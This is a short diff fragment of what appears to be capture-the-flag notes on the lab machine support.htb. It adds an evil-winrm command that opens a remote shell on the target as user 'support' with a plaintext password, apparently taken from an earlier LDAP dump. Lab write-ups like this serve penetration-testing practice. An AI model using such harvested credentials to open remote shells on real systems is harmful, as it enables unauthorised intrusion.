@@ -185,3 +185,9 @@ sAMAccountName: ford.victoria
 
 ```
 
+
+```bash
+evil-winrm -u "support" -p "Ironside47pleasure40Watchful" --ip support.htb
+```
+![[Pasted image 20250622105158.png]]
+
